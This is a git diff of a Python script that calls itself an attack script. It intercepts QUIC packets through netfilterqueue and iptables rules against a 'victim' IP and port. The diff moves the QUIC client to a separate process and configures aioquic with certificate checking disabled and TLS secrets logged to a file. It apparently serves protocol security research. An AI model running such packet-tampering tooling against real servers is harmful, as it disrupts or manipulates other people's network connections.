@@ -1,14 +1,34 @@
 #!/usr/bin/python3
 
+#from concurrent.futures import process
 from netfilterqueue import NetfilterQueue
 from scapy.all import *
 import time
 import subprocess
 import os
+import ssl
 import argparse
 from argparse import RawTextHelpFormatter
+from multiprocessing import Process
+
+import aioquic
+from aioquic.asyncio.client import connect
+from aioquic.asyncio.protocol import QuicConnectionProtocol
+from aioquic.h0.connection import H0_ALPN, H0Connection
+from aioquic.h3.connection import H3_ALPN, H3Connection
+from aioquic.h3.events import (
+    DataReceived,
+    H3Event,
+    HeadersReceived,
+    PushPromiseReceived,
+)
+from aioquic.quic.configuration import QuicConfiguration
+from aioquic.quic.events import QuicEvent
+from aioquic.tls import CipherSuite, SessionTicket
+
+from aioquic.quic.packet import QuicProtocolVersion
+
 import minimal_http_client as cl
-import threading
 
 
 banner = '''
@@ -141,11 +161,21 @@ def server_initial_callback(packet, args=None):
     packet.accept()
 
 
-def start_client(args):
+def configure_client(args):
+
     url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
     version = 'VNRF' if args.mode == "vn" else "VERSION_1"
-    cl.start_client(url, args.cid_len, version, args.alpn)
-        
+
+    configuration = QuicConfiguration(
+        is_client=True, 
+        supported_versions =  [QuicProtocolVersion[version].value],
+        alpn_protocols=[args.alpn],
+        verify_mode = ssl.CERT_NONE,
+        secrets_log_file = open("secrets/secrets.log","a"),
+        connection_id_length = args.cid_len,
+    )
+    
+    return url, configuration
 
 def main():
 
@@ -174,12 +204,14 @@ def main():
         else:
             raise NotImplementedError("Mode not implemented")
 
-        print("[+] Starting quic client")
-        cl_thread = threading.Thread(target=start_client, args = (args, ))
-        cl_thread.daemon = True
-        cl_thread.start()
+        print("[+] Starting client")
+        url, configuration = configure_client(args)
+        p = Process(target=cl.start_client, args=(url, configuration,))
+        p.start()
+        
         print("[+] Hooking into nfqueue")
         q.run()
+
     except KeyboardInterrupt:
         print("[-] Keyboard interrupt received. Terminating attack script.")
     except Exception as e:
@@ -187,16 +219,16 @@ def main():
         print(e)
     finally:
         print("\n[+] Cleaning up")
+        print("[-] Terminating Client")
+        p.kill()
         print("[-] Unbinding netfilter queue.")
         q.unbind() 
         print("[-] Deleting iptables rule(s).")
         iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
         print(iptables_delete)
         subprocess.run(iptables_delete.split())
-        print("[!] Termination of client currently buggy. Send second Ctrl+C!")
-        cl_thread.join()
         print("[+] Done")
 
-
+    
 if __name__ == "__main__":
     main()
